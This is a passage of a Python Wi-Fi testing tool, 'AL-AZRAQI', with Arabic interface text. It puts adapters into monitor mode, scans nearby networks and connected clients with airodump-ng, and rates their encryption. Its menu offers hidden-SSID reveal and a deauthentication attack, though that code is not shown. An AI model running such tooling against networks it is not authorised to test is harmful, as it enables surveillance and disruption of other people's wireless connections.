#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔═══════════════════════════════════════════════════════════════╗
║                    AL-AZRAQI v4.0                             ║
║              Cyber HUD Interface Edition                      ║
║       Advanced Wi-Fi Security Testing Framework               ║
╚═══════════════════════════════════════════════════════════════╝
"""

import os
import sys
import csv
import time
import random
import subprocess
import shutil
import tempfile
import signal
import json
import re
import platform
import socket
import glob
import math
from datetime import datetime
from typing import List, Dict, Optional, Tuple
from collections import defaultdict
from dataclasses import dataclass, field

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.progress import (
        Progress, BarColumn, TextColumn,
        TimeElapsedColumn, SpinnerColumn
    )
    from rich.text import Text
    from rich.align import Align
    from rich import box
    from rich.columns import Columns
    from rich.layout import Layout
except ImportError:
    print("\n[!] rich غير مثبتة: pip3 install rich\n")
    sys.exit(1)

try:
    from blessed import Terminal
    HAS_BLESSED = True
except ImportError:
    HAS_BLESSED = False

try:
    from pyfiglet import figlet_format
    HAS_FIGLET = True
except ImportError:
    HAS_FIGLET = False

console = Console()
term = Terminal() if HAS_BLESSED else None
TOOL_NAME = "AL-AZRAQI"
VERSION = "4.0"
DEFAULT_INTERFACE = "wlan0"
REQUIRED_TOOLS = ["airodump-ng", "aireplay-ng", "iwconfig", "tshark", "airmon-ng"]
REPORTS_DIR = os.path.expanduser("~/alazraqi_reports")

_active_processes: List[subprocess.Popen] = []
_temp_dirs: List[str] = []


@dataclass
class Network:
    bssid: str
    ssid: str
    channel: str
    encryption: str
    power_values: List[int] = field(default_factory=list)
    hidden: bool = False

    @property
    def power_avg(self) -> Optional[int]:
        return int(sum(self.power_values) / len(self.power_values)) if self.power_values else None

    @property
    def power_max(self) -> Optional[int]:
        return max(self.power_values) if self.power_values else None

    @property
    def power_min(self) -> Optional[int]:
        return min(self.power_values) if self.power_values else None


@dataclass
class Client:
    mac: str
    bssid: str
    power_values: List[int] = field(default_factory=list)
    packets: int = 0
    probes: str = ""

    @property
    def power_avg(self) -> Optional[int]:
        return int(sum(self.power_values) / len(self.power_values)) if self.power_values else None


@dataclass
class DeauthEvent:
    timestamp: str
    source: str
    destination: str
    bssid: str
    frame_type: str


def signal_handler(sig, frame):
    if term:
        term.normal_cursor()
        term.clear()
    console.print("\n")
    console.print(Panel(
        "[bold yellow]⚠ تم إيقاف الأداة بواسطة المستخدم[/bold yellow]",
        border_style="yellow"))
    cleanup()
    sys.exit(0)


signal.signal(signal.SIGINT, signal_handler)


def cleanup():
    for proc in list(_active_processes):
        try:
            if proc.poll() is None:
                proc.terminate()
                try:
                    proc.wait(timeout=3)
                except subprocess.TimeoutExpired:
                    proc.kill()
                    try:
                        proc.wait(timeout=2)
                    except Exception:
                        pass
        except Exception:
            pass
    _active_processes.clear()

    for d in list(_temp_dirs):
        try:
            if os.path.isdir(d):
                shutil.rmtree(d, ignore_errors=True)
        except Exception:
            pass
    _temp_dirs.clear()


def check_root() -> bool:
    if os.geteuid() != 0:
        console.print(Panel(
            "[bold red]✖ يجب تشغيل الأداة بصلاحيات root[/bold red]\n"
            "[yellow]استخدم: sudo python3 alazraqi.py[/yellow]",
            title="[bold red]خطأ في الصلاحيات[/bold red]",
            border_style="red"))
        return False
    return True


def check_dependencies() -> Tuple[bool, List[str]]:
    missing = [t for t in REQUIRED_TOOLS if shutil.which(t) is None]
    return len(missing) == 0, missing


def safe_run_cmd(cmd: List[str], timeout: int = 5) -> Tuple[int, str, str]:
    try:
        result = subprocess.run(cmd, capture_output=True, timeout=timeout)
        stdout = result.stdout.decode("utf-8", errors="replace")
        stderr = result.stderr.decode("utf-8", errors="replace")
        return result.returncode, stdout, stderr
    except subprocess.TimeoutExpired:
        return -1, "", "Timeout"
    except Exception as e:
        return -1, "", str(e)


def list_wireless_interfaces() -> List[str]:
    interfaces = []
    rc, out, _ = safe_run_cmd(["iwconfig"])
    if rc == 0:
        for line in out.split("\n"):
            if line and not line.startswith(" ") and "no wireless" not in line.lower():
                iface = line.split()[0]
                if iface and not iface.startswith("lo"):
                    interfaces.append(iface)
    return interfaces


def find_monitor_interface(base_name: str = "") -> str:
    rc, out, _ = safe_run_cmd(["iwconfig"])
    if rc != 0:
        return ""
    
    for line in out.split("\n"):
        if "Mode:Monitor" in line:
            parts = line.split()
            if parts:
                iface = parts[0]
                if base_name:
                    base = base_name.replace("mon", "").replace("mon0", "")
                    if iface.startswith(base) or base in iface:
                        return iface
                else:
                    return iface
    return ""


def check_interface(interface: str) -> str:
    rc, out, err = safe_run_cmd(["iwconfig", interface])
    
    if rc != 0:
        available = list_wireless_interfaces()
        console.print(Panel(
            f"[bold red]✖ الواجهة {interface} غير موجودة[/bold red]\n"
            "[yellow]الواجهات المتاحة:[/yellow]\n" + 
            "\n".join(f"  • {i}" for i in available or ["لا توجد واجهات"]),
            title="[bold red]خطأ في الواجهة[/bold red]",
            border_style="red"))
        return ""
    
    if "Mode:Monitor" in out:
        return interface
    
    console.print(Panel(
        f"[bold yellow]⚠ الواجهة {interface} ليست في وضع المراقبة[/bold yellow]\n"
        f"[cyan]الوضع الحالي: Managed (عادي)[/cyan]",
        border_style="yellow"))
    
    choice = console.input(
        "[bold cyan]تفعيل وضع المراقبة تلقائياً؟ (y/n): [/bold cyan]"
    ).strip().lower()
    
    if choice not in ("y", "yes", "نعم", ""):
        return ""
    
    console.print(Panel(
        f"[bold cyan]⏳ جاري تفعيل وضع المراقبة على [bold]{interface}[/bold]...[/bold cyan]",
        title="[bold magenta]🔄 تفعيل تلقائي[/bold magenta]",
        border_style="cyan"))
    
    try:
        safe_run_cmd(["airmon-ng", "check", "kill"], timeout=10)
        rc2, out2, err2 = safe_run_cmd(["airmon-ng", "start", interface], timeout=15)
        
        if rc2 != 0:
            console.print(f"[bold red]✖ فشل التفعيل:[/bold red]\n{err2}")
            return ""
        
        time.sleep(2)
        new_interface = find_monitor_interface(interface)
        
        if new_interface:
            console.print(Panel(
                f"[bold green]✔ تم التفعيل بنجاح![/bold green]\n"
                f"[bold cyan]الواجهة:[/bold cyan] {new_interface}",
                title="[bold green]✅ نجاح[/bold green]",
                border_style="green"))
            return new_interface
        
        new_interface = find_monitor_interface()
        if new_interface:
            return new_interface
        
        console.print("[bold red]✖ تعذر العثور على الواجهة[/bold red]")
        return ""
    except Exception as e:
        console.print(f"[bold red]✖ خطأ: {e}[/bold red]")
        return ""


def create_temp_dir() -> str:
    d = tempfile.mkdtemp(prefix="alazraqi_")
    _temp_dirs.append(d)
    return d


def terminate_process(proc: subprocess.Popen, timeout: int = 3) -> bool:
    if proc is None or proc.poll() is not None:
        return True
    try:
        proc.terminate()
        proc.wait(timeout=timeout)
        return True
    except subprocess.TimeoutExpired:
        try:
            proc.kill()
            proc.wait(timeout=2)
            return True
        except Exception:
            return False
    except Exception:
        return False


def get_big_logo() -> str:
    if HAS_FIGLET:
        try:
            return figlet_format("ALAZRAQI", font="big")
        except Exception:
            pass
    
    return """
    _    ____    _    ____ ___ ____  
   / \\  / ___|  / \\  / ___|_ _|  _ \\ 
  / _ \\| |  _  / _ \\| |    | || |_) |
 / ___ \\ |_| |/ ___ \\ |___ | ||  __/ 
/_/   \\_\\____/_/   \\_\\____|___|_|    
"""


def cinematic_intro():
    os.system("clear")
    
    console.print()
    chars = "01アイウエオカキクケコサシスセソタチツテトナニヌネノ<>{}[]#$%&*ALAZRAQI"
    colors_cycle = ["bright_red", "bright_green", "bright_blue", "bright_cyan"]
    
    for _ in range(12):
        lines = []
        width = shutil.get_terminal_size().columns - 2
        for _ in range(15):
            line = "".join(random.choice(chars) for _ in range(width))
            color = random.choice(colors_cycle)
            lines.append(f"[{color}]{line}[/{color}]")
        console.print("\n".join(lines))
        time.sleep(0.06)
        os.system("clear")
    
    console.print()
    logo = get_big_logo()
    
    colored_logo = ""
    for line in logo.split("\n"):
        colored_logo += f"[bold bright_red]{line}[/bold bright_red]\n"
    
    console.print(Align.center(Text(colored_logo.strip())))
    console.print()
    console.print(Align.center(Text("A L - A Z R A Q I", style="bold bright_green")))
    console.print(Align.center(Text("Advanced Wi-Fi Security Framework", style="italic bright_cyan")))
    console.print(Align.center(Text(f"Version {VERSION} | Shadow Interface Edition", style="bold yellow")))
    console.print()
    
    boot_steps = [
        ("[INIT]", "Loading kernel modules...", "bright_cyan"),
        ("[OK  ]", "Network stack initialized", "bright_green"),
        ("[OK  ]", "Wi-Fi adapter detected", "bright_green"),
        ("[OK  ]", "Monitor mode ready", "bright_green"),
        ("[OK  ]", "Security modules loaded", "bright_green"),
        ("[OK  ]", "Encryption engines ready", "bright_green"),
        ("[OK  ]", "Deauth framework ready", "bright_green"),
        ("[OK  ]", "Defense monitor active", "bright_green"),
        ("[LOAD]", "Initializing Shadow Interface...", "bright_yellow"),
        ("[OK  ]", "Dashboard ready", "bright_green"),
        ("[OK  ]", "All systems operational", "bright_green"),
    ]
    
    for prefix, msg, color in boot_steps:
        console.print(f"  [{color}]{prefix}[/{color}] {msg}")
        time.sleep(0.12)
    
    time.sleep(0.8)
    os.system("clear")


def get_system_info() -> Dict[str, str]:
    try:
        with open("/proc/uptime", "r") as f:
            uptime_seconds = float(f.readline().split()[0])
            hours = int(uptime_seconds // 3600)
            minutes = int((uptime_seconds % 3600) // 60)
            uptime_str = f"{hours}h {minutes}m"
    except Exception:
        uptime_str = "Unknown"
    
    return {
        "OS": f"Kali Linux {platform.release()}" if os.path.exists("/etc/kali-release") else platform.system(),
        "Kernel": platform.release(),
        "Uptime": uptime_str,
        "Hostname": socket.gethostname(),
        "Python": platform.python_version(),
        "Time": datetime.now().strftime("%H:%M:%S")
    }


def get_tools_status() -> Dict[str, bool]:
    return {tool: shutil.which(tool) is not None for tool in REQUIRED_TOOLS}


def get_wifi_status(interface: str) -> Dict[str, str]:
    rc, out, _ = safe_run_cmd(["iwconfig", interface])
    if rc != 0:
        return {"Interface": interface, "Mode": "Unknown", "Status": "Not Found"}
    
    mode = "Managed" if "Mode:Managed" in out else "Monitor" if "Mode:Monitor" in out else "Unknown"
    return {
        "Interface": interface,
        "Mode": mode,
        "Status": "Ready" if mode == "Monitor" else "Not Ready"
    }


def draw_rotating_globe(width: int, height: int, offset: float) -> List[str]:
    lines = []
    globe_chars = "░▒▓█"
    
    for y in range(height):
        line = ""
        for x in range(width):
            nx = (x - width/2) / (width/2)
            ny = (y - height/2) / (height/2)
            dist = math.sqrt(nx*nx + ny*ny)
            
            if dist <= 1.0:
                angle = math.atan2(ny, nx) + offset
                intensity = (math.sin(angle * 3) + 1) / 2
                
                char_idx = int(intensity * (len(globe_chars) - 1))
                line += globe_chars[char_idx]
            else:
                line += " "
        lines.append(line)
    
    return lines


def draw_spectrum_analyzer(width: int, height: int) -> List[str]:
    lines = []
    bars = [" ", "▁", "▂", "▃", "▄", "▅", "▆", "▇", "█"]
    
    for y in range(height):
        line = ""
        threshold = height - y - 1
        
        for x in range(width):
            val = random.random()
            if val > (threshold / height):
                bar_idx = int((val - threshold/height) * len(bars))
                bar_idx = min(bar_idx, len(bars)-1)
                line += bars[bar_idx]
            else:
                line += " "
        lines.append(line)
    
    return lines


def display_cyber_dashboard(interface: str, logs: List[str]):
    if not term:
        display_dashboard(interface, logs)
        return
    
    console.clear()
    
    sys_info = get_system_info()
    tools = get_tools_status()
    wifi = get_wifi_status(interface)
    
    header_text = f"AL-AZRAQI v{VERSION} | NETWORK SECURITY SUITE | {sys_info['Time']}"
    header_panel = Panel(
        Align.center(Text(header_text, style="bold bright_cyan")),
        box=box.DOUBLE_EDGE,
        border_style="bright_blue",
        padding=(0, 2)
    )
    console.print(header_panel)
    console.print()
    
    sys_table = Table(box=box.SIMPLE, show_header=False, padding=(0, 1))
    sys_table.add_column("Key", style="bold bright_cyan")
    sys_table.add_column("Value", style="bright_green")
    for key, val in sys_info.items():
        sys_table.add_row(key, val)
    sys_panel = Panel(sys_table, title="[bold bright_red]⚡ SYSTEM STATUS[/bold bright_red]", border_style="bright_red")
    
    wifi_table = Table(box=box.SIMPLE, show_header=False, padding=(0, 1))
    wifi_table.add_column("Key", style="bold bright_cyan")
    wifi_table.add_column("Value", style="bright_green")
    for key, val in wifi.items():
        color = "bright_green" if val in ("Ready", "Monitor") else "bright_yellow"
        wifi_table.add_row(key, f"[{color}]{val}[/{color}]")
    wifi_panel = Panel(wifi_table, title="[bold bright_cyan]📡 WI-FI ADAPTER[/bold bright_cyan]", border_style="bright_cyan")
    
    tools_table = Table(box=box.SIMPLE, show_header=False, padding=(0, 1))
    tools_table.add_column("Tool", style="bold bright_cyan")
    tools_table.add_column("Status", width=8)
    for tool, status in tools.items():
        icon = "[bright_green]✔[/bright_green]" if status else "[bright_red]✖[/bright_red]"
        tools_table.add_row(tool, icon)
    tools_panel = Panel(tools_table, title="[bold bright_green]🔧 TOOLS STATUS[/bold bright_green]", border_style="bright_green")
    
    menu_items = [
        "[bold bright_yellow][1] 🔍 Scan Networks[/bold bright_yellow]",
        "[bold bright_yellow][2] 🔓 Reveal Hidden SSID[/bold bright_yellow]",
        "[bold bright_yellow][3] 🛡 Defense Monitor[/bold bright_yellow]",
        "[bold bright_yellow][4] ⚔ Deauth Attack[/bold bright_yellow]",
        "[bold bright_yellow][5] 📊 Reports[/bold bright_yellow]",
        "[bold bright_red][0] 🚪 Exit[/bold bright_red]",
    ]
    menu_text = "\n".join(menu_items)
    menu_panel = Panel(menu_text, title="[bold bright_magenta]📋 MAIN MENU[/bold bright_magenta]", border_style="bright_magenta")
    
    top_row = Columns([sys_panel, wifi_panel, tools_panel, menu_panel], equal=True)
    console.print(top_row)
    console.print()
    
    globe_width = 40
    globe_height = 10
    spectrum_height = 5
    
    globe_lines = draw_rotating_globe(globe_width, globe_height, time.time())
    globe_art = "\n".join(f"[bright_blue]{line}[/bright_blue]" for line in globe_lines)
    
    spectrum_lines = draw_spectrum_analyzer(globe_width, spectrum_height)
    spectrum_art = "\n".join(f"[bright_cyan]{line}[/bright_cyan]" for line in spectrum_lines)
    
    globe_panel = Panel(
        f"{globe_art}\n\n{spectrum_art}",
        title="[bold bright_blue]🌐 GLOBAL NETWORK MAP & SPECTRUM[/bold bright_blue]",
        border_style="bright_blue",
        width=globe_width + 4
    )
    
    recent_logs = logs[-8:] if logs else ["System initialized...", "Waiting for input..."]
    logs_text = "\n".join(f"  › {log}" for log in recent_logs)
    logs_panel = Panel(f"[dim]{logs_text}[/dim]", title="[bold bright_blue]📝 LOGS[/bold bright_blue]", border_style="bright_blue")
    
    bottom_row = Columns([globe_panel, logs_panel], equal=False)
    console.print(bottom_row)
    console.print()
    
    footer_text = "AL-AZRAQI | HACK SMARTER .. PROTECT HIGHER"
    footer_panel = Panel(
        Align.center(Text(footer_text, style="bold bright_cyan")),
        box=box.HORIZONTALS,
        border_style="bright_blue",
        padding=(0, 2)
    )
    console.print(footer_panel)


def display_dashboard(interface: str, logs: List[str]):
    console.clear()
    
    sys_info = get_system_info()
    tools = get_tools_status()
    wifi = get_wifi_status(interface)
    
    header = f"""
[bold bright_red]╔══════════════════════════════════════════════════════════════╗[/bold bright_red]
[bold bright_red]║[/bold bright_red]  [bold bright_green]AL-AZRAQI v{VERSION}[/bold bright_green]  │  [bright_cyan]Shadow Interface Edition[/bright_cyan]  │  [bright_yellow]{sys_info['Time']}[/bright_yellow]   [bold bright_red]║[/bold bright_red]
[bold bright_red]╚══════════════════════════════════════════════════════════════╝[/bold bright_red]
"""
    console.print(header)
    
    sys_table = Table(box=box.SIMPLE, show_header=False, padding=(0, 1))
    sys_table.add_column("Key", style="bold bright_cyan", width=12)
    sys_table.add_column("Value", style="bright_green")
    for key, val in sys_info.items():
        sys_table.add_row(key, val)
    sys_panel = Panel(sys_table, title="[bold bright_red]⚡ System Status[/bold bright_red]", border_style="bright_red")
    
    wifi_table = Table(box=box.SIMPLE, show_header=False, padding=(0, 1))
    wifi_table.add_column("Key", style="bold bright_cyan", width=12)
    wifi_table.add_column("Value", style="bright_green")
    for key, val in wifi.items():
        color = "bright_green" if val in ("Ready", "Monitor") else "bright_yellow"
        wifi_table.add_row(key, f"[{color}]{val}[/{color}]")
    wifi_panel = Panel(wifi_table, title="[bold bright_cyan]📡 Wi-Fi Adapter[/bold bright_cyan]", border_style="bright_cyan")
    
    tools_table = Table(box=box.SIMPLE, show_header=False, padding=(0, 1))
    tools_table.add_column("Tool", style="bold bright_cyan", width=15)
    tools_table.add_column("Status", width=10)
    for tool, status in tools.items():
        icon = "[bright_green]✔[/bright_green]" if status else "[bright_red]✖[/bright_red]"
        tools_table.add_row(tool, icon)
    tools_panel = Panel(tools_table, title="[bold bright_green]🔧 Tools Status[/bold bright_green]", border_style="bright_green")
    
    menu_items = [
        "[bold bright_yellow][1] 🔍 Scan Wireless Networks[/bold bright_yellow]",
        "[bold bright_yellow][2] 🔓 Reveal Hidden SSID (Targeted)[/bold bright_yellow]",
        "[bold bright_yellow][3] 🛡 Defense Monitor[/bold bright_yellow]",
        "[bold bright_yellow][4] ⚔ Execute Deauth Attack[/bold bright_yellow]",
        "[bold bright_yellow][5] 📊 View Reports[/bold bright_yellow]",
        "[bold bright_red][0] 🚪 Exit[/bold bright_red]",
    ]
    menu_text = "\n".join(menu_items)
    menu_panel = Panel(menu_text, title="[bold bright_magenta]📋 Main Menu[/bold bright_magenta]", border_style="bright_magenta")
    
    top_panels = Columns([sys_panel, wifi_panel, tools_panel, menu_panel], equal=True)
    console.print(top_panels)
    console.print()
    
    network_art = """
    ╭──────────────────────────────────────────────────────╮
    │  ╔═══╗     ╔═══╗     ╔═══╗     ╔═══╗                │
    │  ║AP1║─────║AP2║─────║AP3║─────║AP4║                │
    │  ╚═╤═╝     ╚═╤═╝     ╚═╤═╝     ╚═╤═╝                │
    │    │         │         │         │                   │
    │  ┌─┴─┐   ┌───┴───┐   ┌─┴─┐   ┌───┴───┐             │
    │  │C1 │   │  C2   │   │C3 │   │  C4   │             │
    │  └───┘   └───────┘   └───┘   └───────┘             │
    │  [bold bright_green]● Online[/bold bright_green]  [bright_yellow]● Scanning...[/bright_yellow]  [bright_red]● Alert[/bright_red]         │
    ╰──────────────────────────────────────────────────────╯
    """
    network_panel = Panel(network_art, title="[bold bright_red]🌐 Network Topology[/bold bright_red]", border_style="bright_red")
    
    recent_logs = logs[-8:] if logs else ["System initialized...", "Waiting for input..."]
    logs_text = "\n".join(f"  › {log}" for log in recent_logs)
    logs_panel = Panel(f"[dim]{logs_text}[/dim]", title="[bold bright_blue]📝 Logs[/bold bright_blue]", border_style="bright_blue")
    
    layout = Layout()
    layout.split_row(Layout(network_panel, ratio=2), Layout(logs_panel, ratio=1))
    console.print(layout)
    console.print()


def run_dashboard(interface: str) -> str:
    logs: List[str] = ["System initialized", "All modules loaded", f"Interface: {interface}"]
    
    while True:
        display_cyber_dashboard(interface, logs)
        
        try:
            choice = input("\n>>> Select option: ").strip()
        except (EOFError, KeyboardInterrupt):
            return "exit"
        
        if choice == "1":
            logs.append("Starting wireless scan...")
            return "scan"
        elif choice == "2":
            logs.append("Hidden SSID targeted reveal mode")
            return "reveal"
        elif choice == "3":
            logs.append("Defense monitor activated")
            return "monitor"
        elif choice == "4":
            logs.append("Deauth attack mode")
            return "attack"
        elif choice == "5":
            logs.append("Viewing reports")
            return "reports"
        elif choice == "0":
            logs.append("Exiting...")
            return "exit"
        else:
            logs.append(f"Invalid choice: {choice}")
            console.print("[bold red]❌ خيار غير صالح، حاول مرة أخرى[/bold red]")
            time.sleep(1)


def find_csv_file(prefix: str) -> Optional[str]:
    patterns = [
        f"{prefix}-01.csv",
        f"{prefix}.csv",
        f"{prefix}-01.kismet.csv",
    ]
    
    for pattern in patterns:
        if os.path.isfile(pattern):
            return pattern
    
    dir_path = os.path.dirname(prefix) or "."
    base_name = os.path.basename(prefix)
    search_pattern = os.path.join(dir_path, f"{base_name}*.csv")
    matches = glob.glob(search_pattern)
    
    if matches:
        matches.sort(key=os.path.getmtime, reverse=True)
        return matches[0]
    
    return None


def parse_airodump_csv(csv_path: str) -> Tuple[List[Network], List[Client]]:
    networks_map: Dict[str, Network] = {}
    clients_map: Dict[str, Client] = {}

    if not os.path.isfile(csv_path):
        console.print(f"[bold red]✖ ملف CSV غير موجود: {csv_path}[/bold red]")
        return [], []

    try:
        with open(csv_path, "r", encoding="utf-8-sig", errors="ignore") as f:
            content = f.read()
        
        sections = content.split("Station MAC")
        ap_section = sections[0]
        station_section = sections[1] if len(sections) > 1 else ""
        
        ap_lines = ap_section.strip().split("\n")
        
        header_line_idx = -1
        for i, line in enumerate(ap_lines):
            if "BSSID" in line.upper() and "FIRST TIME SEEN" in line.upper():
                header_line_idx = i
                break
        
        if header_line_idx >= 0:
            data_lines = ap_lines[header_line_idx + 1:]
            reader = csv.reader(data_lines)
            
            for row in reader:
                if not row or len(row) < 2:
                    continue
                
                row = [cell.strip() for cell in row]
                
                bssid = row[0]
                if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", bssid):
                    continue
                
                channel = row[3] if len(row) > 3 else "0"
                privacy = row[5] if len(row) > 5 else "Unknown"
                cipher = row[6] if len(row) > 6 else ""
                auth = row[7] if len(row) > 7 else ""
                power_str = row[8] if len(row) > 8 else ""
                essid = row[13] if len(row) > 13 else ""
                
                power = None
                try:
                    power = int(power_str)
                except (ValueError, TypeError):
                    power = None
                
                if bssid in networks_map:
                    if power is not None:
                        networks_map[bssid].power_values.append(power)
                    if essid and essid != "\\x00" and not essid.isspace():
                        networks_map[bssid].ssid = essid
                        networks_map[bssid].hidden = False
                    continue
                
                hidden = False
                display_ssid = essid
                if not essid or essid == "\\x00" or essid.isspace() or essid == "":
                    hidden = True
                    display_ssid = "<hidden>"
                
                encryption_parts = [p for p in [privacy, cipher, auth] if p and p.strip()]
                encryption = "/".join(encryption_parts) if encryption_parts else "Unknown"
                
                networks_map[bssid] = Network(
                    bssid=bssid,
                    ssid=display_ssid,
                    channel=channel,
                    encryption=encryption,
                    power_values=[power] if power is not None else [],
                    hidden=hidden
                )
        
        if station_section.strip():
            st_lines = station_section.strip().split("\n")
            
            st_header_idx = -1
            for i, line in enumerate(st_lines):
                if "STATION MAC" in line.upper() or "MAC" in line.upper():
                    st_header_idx = i
                    break
            
            if st_header_idx >= 0:
                st_data_lines = st_lines[st_header_idx + 1:]
                reader = csv.reader(st_data_lines)
                
                for row in reader:
                    if not row or len(row) < 2:
                        continue
                    
                    row = [cell.strip() for cell in row]
                    station_mac = row[0]
                    
                    if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", station_mac):
                        continue
                    
                    bssid_assoc = row[5] if len(row) > 5 else ""
                    power_str = row[3] if len(row) > 3 else ""
                    packets_str = row[4] if len(row) > 4 else "0"
                    probes = row[6] if len(row) > 6 else ""
                    
                    power = None
                    try:
                        power = int(power_str)
                    except (ValueError, TypeError):
                        power = None
                    
                    packets = 0
                    try:
                        packets = int(packets_str)
                    except (ValueError, TypeError):
                        packets = 0
                    
                    if station_mac in clients_map:
                        if power is not None:
                            clients_map[station_mac].power_values.append(power)
                        clients_map[station_mac].packets = max(clients_map[station_mac].packets, packets)
                        continue
                    
                    clients_map[station_mac] = Client(
                        mac=station_mac,
                        bssid=bssid_assoc.strip(),
                        power_values=[power] if power is not None else [],
                        packets=packets,
                        probes=probes.strip()
                    )

    except Exception as e:
        console.print(f"[bold red]✖ خطأ في قراءة CSV: {e}[/bold red]")
        import traceback
        console.print(f"[dim]{traceback.format_exc()}[/dim]")

    return list(networks_map.values()), list(clients_map.values())


def scan_networks(interface: str, duration: int = 15) -> Tuple[List[Network], List[Client]]:
    temp_dir = create_temp_dir()
    prefix = os.path.join(temp_dir, "scan")

    rc_check, out_check, _ = safe_run_cmd(["iwconfig", interface])
    if rc_check != 0 or "Mode:Monitor" not in out_check:
        console.print(Panel(
            f"[bold red]✖ الواجهة {interface} ليست في وضع المراقبة![/bold red]",
            border_style="red"))
        return [], []

    console.print(Panel(
        f"[bold bright_yellow]⏳ جاري فحص الشبكات عبر [bold]{interface}[/bold]...[/bold bright_yellow]\n"
        f"[dim]المدة: {duration} ثانية[/dim]",
        title="[bold bright_magenta]🔍 فحص الشبكات[/bold bright_magenta]",
        border_style="bright_yellow"))

    proc = None
    try:
        cmd = ["airodump-ng", "--write", prefix, "--output-format", "csv", interface]
        console.print(f"[dim]الأمر: {' '.join(cmd)}[/dim]")

        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        _active_processes.append(proc)

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(bar_width=40),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TimeElapsedColumn(),
            console=console,
            transient=False
        ) as progress:
            task = progress.add_task("[bright_cyan]جاري المسح...", total=duration)
            for i in range(duration):
                time.sleep(1)
                progress.update(task, advance=1)
                
                csv_file = find_csv_file(prefix)
                if csv_file and os.path.isfile(csv_file):
                    try:
                        with open(csv_file, "r", encoding="utf-8-sig", errors="ignore") as f:
                            content = f.read()
                        ap_count = len(re.findall(r'^[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}', content, re.MULTILINE))
                        if ap_count > 0:
                            progress.console.print(f"\r[bright_green]  ↳ تم رصد {ap_count} شبكة حتى الآن...[/bright_green]", end="")
                    except:
                        pass

        terminate_process(proc)
        if proc in _active_processes:
            _active_processes.remove(proc)

        csv_file = find_csv_file(prefix)
        
        if not csv_file:
            console.print(Panel(
                "[bold red]✖ لم يتم العثور على ملف النتائج[/bold red]\n"
                f"[dim]البحث في: {prefix}*.csv[/dim]",
                border_style="red"))
            return [], []

        file_size = os.path.getsize(csv_file)
        console.print(f"[dim]ملف النتائج: {csv_file} ({file_size} بايت)[/dim]")

        if file_size < 100:
            console.print(Panel(
                "[bold yellow]⚠ ملف النتائج صغير جداً[/bold yellow]",
                border_style="yellow"))
            return [], []

        networks, clients = parse_airodump_csv(csv_file)

        if not networks:
            console.print(Panel(
                "[bold yellow]⚠ لم يتم اكتشاف شبكات[/bold yellow]\n"
                "[dim]الأسباب المحتملة:[/dim]\n"
                "  • لا توجد شبكات قريبة\n"
                "  • الكرت لا يلتقط الإشارات بشكل صحيح\n"
                "  • تحتاج لزيادة مدة الفحص",
                border_style="yellow"))
        else:
            console.print(f"[bold bright_green]✔ تم اكتشاف {len(networks)} شبكة و {len(clients)} جهاز[/bold bright_green]")

        return networks, clients

    except FileNotFoundError:
        console.print("[bold red]✖ الأمر airodump-ng غير موجود[/bold red]")
        return [], []
    except Exception as e:
        console.print(f"[bold red]✖ خطأ: {e}[/bold red]")
        import traceback
        console.print(f"[dim]{traceback.format_exc()}[/dim]")
        return [], []
    finally:
        if proc and proc.poll() is None:
            terminate_process(proc)


def classify_signal(power: Optional[int]) -> Tuple[str, str]:
    if power is None:
        return "غير متاح", "dim"
    if power >= -50:
        return "ممتازة", "bold bright_green"
    if power >= -60:
        return "جيدة", "bright_green"
    if power >= -70:
        return "متوسطة", "bright_yellow"
    if power >= -80:
        return "ضعيفة", "bright_red"
    return "ضعيفة جداً", "bold bright_red"


def format_power_display(net) -> str:
    if not net.power_values:
        return "[dim]غير متاح[/dim]"

    avg = net.power_avg
    label, style = classify_signal(avg)

    if len(net.power_values) > 1:
        return f"[{style}]{avg} dBm ({label})[/{style}]\n[dim]↑{net.power_max} ↓{net.power_min}[/dim]"
    return f"[{style}]{avg} dBm ({label})[/{style}]"


def evaluate_security(encryption: str) -> Tuple[str, str, str]:
    enc_lower = encryption.lower()

    if enc_lower == "open" or enc_lower == "opn" or "open" in enc_lower.split("/"):
        return "🔴 مفتوح", "مكشوف بالكامل", "bright_red"
    if "wep" in enc_lower:
        return "🔴 WEP", "ضعيف جداً - قابل للكسر", "bright_red"
    if "wpa3" in enc_lower:
        return "🟢 WPA3", "الأقوى حالياً", "bright_green"
    if "wpa2" in enc_lower:
        return "🟡 WPA2", "جيد - يُنصح بترقية", "bright_yellow"
    if "wpa" in enc_lower:
        return "🟠 WPA", "متوسط - يُنصح بالترقية", "bright_red"
    if "unknown" in enc_lower or not encryption.strip():
        return "⚪ غير معروف", "تعذر تحديد التشفير", "dim"
    return f"⚪ {encryption}", "غير مصنف", "dim"


def display_networks(networks: List[Network]) -> None:
    if not networks:
        console.print(Panel("[bold bright_yellow]⚠ لم يتم العثور على أي شبكة[/bold bright_yellow]", border_style="bright_yellow"))
        return

    table = Table(
        title="📡 الشبكات المكتشفة",
        box=box.ROUNDED,
        border_style="bright_cyan",
        title_style="bold bright_magenta",
        show_lines=True
    )
    table.add_column("#", style="bold bright_yellow", justify="center", width=4)
    table.add_column("SSID", style="bold bright_green", max_width=25)
    table.add_column("BSSID", style="bright_cyan", width=18)
    table.add_column("CH", style="bright_magenta", justify="center", width=4)
    table.add_column("التشفير", style="bright_blue", width=18)
    table.add_column("التقييم", width=22)
    table.add_column("الإشارة", justify="center", width=22)

    for i, net in enumerate(networks, 1):
        security_label, security_note, security_style = evaluate_security(net.encryption)
        power_display = format_power_display(net)

        ssid_display = net.ssid
        if net.hidden:
            ssid_display = f"[dim italic]🔒 {net.ssid}[/dim italic]"

        table.add_row(
            str(i), ssid_display, net.bssid, net.channel,
            net.encryption or "[dim]—[/dim]",
            f"[{security_style}]{security_label}[/{security_style}]\n[dim]{security_note}[/dim]",
            power_display
        )

    console.print(table)


def display_clients(clients: List[Client]) -> None:
    if not clients:
        console.print(Panel(
            "[bold bright_yellow]⚠ لم يتم رصد أي جهاز[/bold bright_yellow]\n"
            "[dim]عدم الرصد لا يعني عدم وجود أجهزة متصلة[/dim]",
            border_style="bright_yellow"))
        return

    table = Table(
